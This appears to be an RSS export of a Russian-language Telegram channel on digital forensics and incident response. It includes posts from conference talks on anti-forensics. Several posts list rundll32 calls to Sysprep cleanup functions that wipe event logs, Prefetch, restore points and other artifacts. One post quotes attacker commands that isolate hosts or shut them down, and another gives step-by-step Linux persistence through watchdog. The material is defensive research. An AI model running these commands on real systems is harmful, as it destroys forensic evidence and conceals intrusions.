+P.S.: прекрасная конференция, организаторы — лучшие. 😘
+
+[Media: Видео]</description><pubDate>Thu, 22 May 2025 08:50:13 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_18</guid></item><item><title>#anti_forensics #sysprep</title><link>https://t.me/gardendetective/17</link><description>#anti_forensics #sysprep
+🔴 Также в ОС Windows есть экспортная функция Sysprep_Clean_Net из библиотеки spnet.dll, которая выводит хост из домена Active Directory.
+Команда №1:
+rundll32.exe spnet.dll,Sysprep_Clean_Net
+Команда №2:
+rundll32.exe spnet.dll,#1
+🔵 Когда я обнаружил этот метод, способный существенно усложнить жизнь ИТ-администраторам при управлении Windows-инфраструктурой (например, при необходимости централизованного запуска утилиты для сбора триажа через GPO), сразу вспомнились две группировки: OldGremlin и Shadow.
+1️⃣ OldGremlin: на завершающем этапе атаки злоумышленники временно отключали сетевые интерфейсы на хостах.
+sc create ZVoya binPath= "cmd.exe /c C:\Windows\ZVoya.exe" 2022 4 30 13 0 0" start= auto
+➖ Производилась изоляция хоста от сети до указанного времени (см. переданные аргументы).
+2️⃣ Shadow: в некоторых случаях на заключительном этапе атаки группировка отключала системы ИТ-администраторов сценарием PowerShell killhost.ps1 по заранее заготовленному списку хостов, а также меняла другим скриптом пароли всем пользователям домена.
+Invoke-Command -ComputerName $computers -ScriptBlock { Stop-Computer -Force -Confirm:$false }
+🔵 Все эти действия приводят к увеличению времени на реагирование и расследование инцидента ИБ.
+
+[Media: Видео]</description><pubDate>Mon, 28 Apr 2025 11:04:09 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_17</guid></item><item><title>#anti_forensics #sysprep</title><link>https://t.me/gardendetective/16</link><description>#anti_forensics #sysprep
+Список экспортируемых функций из разных DLL (из доклада "Уйди в туман, запутай след"), которые можно использовать для очистки данных из некоторых источников криминалистических артефактов в ОС Windows.
+🔴 Windows Search:
+rundll32.exe mssrch.dll,MSSrch_SysPrep_Cleanup
+rundll32.exe mssrch.dll,#22
+*️⃣остановка/отключение службы WSearch;
+*️⃣удаление содержимого каталога %ProgramData%\Microsoft\Search\Data\Applications\Windows и самого каталога;
+*️⃣удаление некоторых подразделов из HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search.
+🔴 Prefetch:
+rundll32.exe sysmain.dll,PfSvSysprepCleanup
+rundll32.exe sysmain.dll,#14
+*️⃣остановка службы SysMain.
+*️⃣удаление файлов из каталогов %WINDIR%\Prefetch и %WINDIR%\Prefetch\ReadyBoot.
+🔴 WER:
+rundll32.exe wer.dll,WerSysprepCleanup
+rundll32.exe wer.dll,#1
+*️⃣удаление файлов и папок из каталога %ALLUSERSPROFILE%\Microsoft\Windows\WER.
+🔴 EVTX:
+rundll32.exe wevtapi.dll,EvtIntSysprepCleanup
+rundll32.exe wevtapi.dll,#1
+*️⃣очистка журналов событий: System, Application, Security, Setup.
+🔴 Restore Points:
+rundll32.exe srclient.dll,SysprepCleanup
+rundll32.exe srclient.dll,#1
+*️⃣удаление всех точек восстановления Windows.
+🔴 Recycle Bin+Profile:
+rundll32.exe shsetup.dll,Sysprep_Cleanup_Shell
+rundll32.exe shsetup.dll,#4
+*️⃣функция SHEmptyRecycleBinW удаляет файлы из Корзины; в данном случае происходит удаление содержимого Корзины со всех дисков;
+*️⃣очистка ключей (у всех пользователей):
+➖ HKCU\Software\Microsoft\Windows\CurrentVersion
+\Explorer\RecentDocs
+➖ HKCU\Software\Microsoft\Windows\CurrentVersion
+\Explorer\RunMRU
+*️⃣удаляет файлы из каталогов, указанных в значениях следующих параметров (у всех пользователей):
+➖ HKCU\Environment\TEMP
+➖ HKCU\Software\Microsoft\Windows\CurrentVersion
+\Explorer\User Shell Folders\Recent
+Тесты проводились на ОС Windows 10 (21H2), а запуск команд осуществлялся под привилегированной учётной записью.</description><pubDate>Sun, 27 Apr 2025 18:39:05 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_16</guid></item><item><title>Message 15</title><link>https://t.me/gardendetective/15</link><description>
+
+[Media: Документ]</description><pubDate>Sat, 26 Apr 2025 16:55:18 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_15</guid></item><item><title>#anti_forensics #inseca</title><link>https://t.me/gardendetective/14</link><description>#anti_forensics #inseca
+Презентация доклада "Уйди в туман, запутай след", с которой я выступал на митапе CTI Meetup от Inseca.
+Прикольное мероприятие, на котором можно не только подушнить, но и в спокойной обстановке обсудить "этот-ваш-мир" ИБ. 💻
+
+[Media: Видео]</description><pubDate>Sat, 26 Apr 2025 16:55:18 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_14</guid></item><item><title>Message 13</title><link>https://t.me/gardendetective/13</link><description>
+
+[Media: Документ]</description><pubDate>Mon, 31 Mar 2025 09:22:57 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_13</guid></item><item><title>#cybercamp2025 #meetup #DFIR</title><link>https://t.me/gardendetective/12</link><description>#cybercamp2025 #meetup #DFIR
+🔵 Заметки по подготовке ИТ-инфраструктуры для первого задания митапа CyberCamp 2025 по теме DFIR (оформлено в Obsidian).
+Дополнительно добавил:
+*️⃣веб-ссылку на архив с данными (триажи, журналы) для задания №1;
+*️⃣презентацию "Криминалистика — это не Дикий Запад, здесь есть правила";
+*️⃣вопросы и ответы к заданию №1.
+
+[Media: Документ]</description><pubDate>Mon, 31 Mar 2025 09:22:43 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_12</guid></item><item><title>Интересно, что же будет на PHDays в этом году. :)</title><link>https://t.me/gardendetective/11</link><description>Интересно, что же будет на PHDays в этом году. :)
+Помимо этих новостей, на этой неделе я также выложу материал о том, как подготавливал ИТ-инфраструктуру для первого задания митапа CyberCamp 2025 по теме DFIR.
+
+[Media: Фото]</description><pubDate>Mon, 24 Mar 2025 19:09:47 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_11</guid></item><item><title>#persistence #linux #watchdog #part_1</title><link>https://t.me/gardendetective/10</link><description>#persistence #linux #watchdog #part_1
+🔵 В статье NCC Group, посвященной RCE-уязвимости CVE-2020-8260 в шлюзах Pulse Connect Secure, я наткнулся на описанный автором способ закрепления в системе — сторожевой таймер (watchdog). Мне сразу стало интересно рассмотреть его подробнее, о чём дальше и пойдёт речь.
+🔵 watchdog — механизм, предназначенный для автоматического восстановления системы в случае сбоев. Он отслеживает активность системы и инициирует её перезагрузку, если не получает подтверждения о работоспособности в течение заданного времени.
+Представим, что атакующие смогли получить доступ к Linux-серверу, повысили свои привилегии до уровня root, а затем закрепились на системе с помощью watchdog.
+Однако есть нюанс: устройство может быть перезагружено, что нежелательно для продолжения атаки. Тем не менее, существует способ предотвратить перезагрузку, который дальше будет учтён в реализации закрепления.
+🔴 Перейдём к самой реализации, которую рассмотрим на примере дистрибутива на основе Debian.
+Нам необходимо:
+1️⃣🔤установить watchdog, если он отсутствует на системе:
+apt install watchdog -y
+2️⃣🔤в конфигурационном файле /etc/watchdog.conf добавить, например, следующие строки:
+test-binary = /home/configure
+interval = 120
+watchdog-timeout = 150
+*️⃣test-binary — проверочный исполняемый файл/скрипт /home/configure, запускаемый watchdog. Если он вернёт ненулевое значение, то при следующей проверки системы (с частотой, указанной в параметре interval) будет инициирована её перезагрузка. В данном случае также должен быть установлен параметр retry-timeout в значение 0.
+*️⃣interval — каждые 120 секунд watchdog выполняет проверку, запуская /home/configure.
+*️⃣watchdog-timeout — если система не отвечает дольше 150 секунд (например, из-за зависания системы), то watchdog будет считать, что система находится в неисправном состоянии и перезагрузит её.
+3️⃣🔤прописать в файле /etc/default/watchdog строку:
+watchdog_options="--no-action"
+*️⃣Данный аргумент предотвращает перезагрузку системы.
+4️⃣🔤настроить службу watchdog для автозапуска при старте системы и запустить её:
+systemctl enable watchdog
+systemctl start watchdog
+🔵 В следующих постах рассмотрим, какие правила детектирования можно реализовать и на что обращать внимание в триаже, собранном с Linux-системы, для идентификации использования watchdog.
+
+[Media: Видео]</description><pubDate>Thu, 13 Mar 2025 12:53:35 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_10</guid></item><item><title>Всем привет!</title><link>https://t.me/gardendetective/9</link><description>Всем привет!
+Сегодня выступал на SOC Forum 2024 с темой про DFIR-утилиты и то, как злоумышленники использовали их в настоящих атаках.
+Также дополнительно прошёлся по популярным "криминалистическим" программам и подготовил базу, которая поможет в реализации детектирующих правил под этот инструментарий.
+С презентацией можно ознакомиться во вложении. :)
+
+[Media: Документ]</description><pubDate>Fri, 08 Nov 2024 14:38:02 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_9</guid></item><item><title>Message 8</title><link>https://t.me/gardendetective/8</link><description/><pubDate>Wed, 05 Nov 2025 08:35:56 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_8</guid></item><item><title>#anti_forensics #sysprep #prefetch</title><link>https://t.me/gardendetective/7</link><description>#anti_forensics #sysprep #prefetch
+🔵 Начнём с файлов трассировки, или Prefetch-файлов (*.pf). Они используются для повышения производительности системы за счёт предварительной загрузки кода часто используемых приложений. Для специалистов по цифровой криминалистике и реагированию на инциденты ИБ Prefetch-файлы полезны тем, что позволяют находить следы запуска программ, в том числе вредоносных. А также стоит отметить, что функция Prefetch по умолчанию включена только на рабочих станциях.
+Местоположение pf-файлов: %WINDIR%\Prefetch
+Максимальное количество pf-файлов в каталоге: 1024 (Win8+)
+Prefetch-файлы содержат в себе следующие полезные данные:
+🔹имя исполняемого файла;
+🔹общее число запусков;
+🔹временные метки последних 8 запусков (Win8+);
+🔹списки и каталоги, с которыми взаимодействовал исполняемый файл;
+🔹и так далее.
+🔴 С помощью экспортируемой функции PfSvSysprepCleanup из библиотеки %WINDIR%\System32\sysmain.dll можно провести удаление pf-файлов. При запуске останавливается служба SysMain, затем удаляются файлы из каталогов %WINDIR%\Prefetch и %WINDIR%\Prefetch\ReadyBoot (см. прикреплённую схему к данному посту).
+Команда №1:
+rundll32.exe sysmain.dll,PfSvSysprepCleanup
+Команда №2:
+rundll32.exe sysmain.dll,#14
+Тесты проводились на ОС Windows 10 (21H2), а запуск команд осуществлялся под привилегированной учётной записью.
+
+[Media: Документ]</description><pubDate>Tue, 08 Oct 2024 12:01:19 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_7</guid></item><item><title>#anti_forensics #sysprep</title><link>https://t.me/gardendetective/3</link><description>#anti_forensics #sysprep
+🔵 Несколько первых постов на данном канале будут посвящены теме анти-форензики в ОС Windows. В них мы рассмотрим способы удаления некоторых источников цифровых криминалистических артефактов, используя определённые экспортируемые функции из системных библиотек.
+Вызовы функций будут производиться посредством штатной программы rundll32.exe.
+🔵 В ходе подготовки к одному из докладов наткнулся на утилиту Sysprep (System Prepatation Tool). Она используется для подготовки устройства к созданию с него образа ОС Windows, который в дальнейшем может быть задействован для массового развёртывания на множестве рабочих станций.
+Теперь давайте подумаем. Если мы создаём эталонный образ ОС Windows с каким-то предустановленным ПО, то без вмешательства пользователя в процессе его настройки не обойтись. Следовательно, после этих работ должны последовать шаги по удалению и очистки системы от ненужных/оставшихся данных — временных файлов, журналов событий, точек восстановления и тому подобное.
+🔵 После прочтения документации по данной утилите на официальном сайте Microsoft и анализу исполняемого файла sysprep.exe пришёл к выводу, что список действий по очистке системы указаны в xml-файлах, находящихся в каталоге %WINDIR%\System32\Sysprep\ActionFiles. Там присутствуют следующие вхождения: deleteFile, deleteDirectory, deleteKey, deleteValue, setValue, sysprepModule (с указанием DLL-библиотеки и функции), stopService и другие. На прикреплённом изображении представлена часть содержимого одного из xml-файлов.
+Более детальный анализ работы Sysprep будет описан позже, а сейчас разберёмся с тем, а какие библиотеки и функции задействуются в ходе работы данной программы.
+
+[Media: Документ]</description><pubDate>Tue, 08 Oct 2024 11:58:52 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_3</guid></item><item><title>Channel photo updated</title><link>https://t.me/gardendetective/2</link><description>Channel photo updated</description><pubDate>Wed, 18 Sep 2024 15:42:13 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_2</guid></item><item><title>Channel created</title><link>https://t.me/gardendetective/1</link><description>Channel created</description><pubDate>Wed, 18 Sep 2024 15:42:11 +0000</pubDate><guid isPermaLink="false">telegram_gardendetective_1</guid></item></channel></rss>
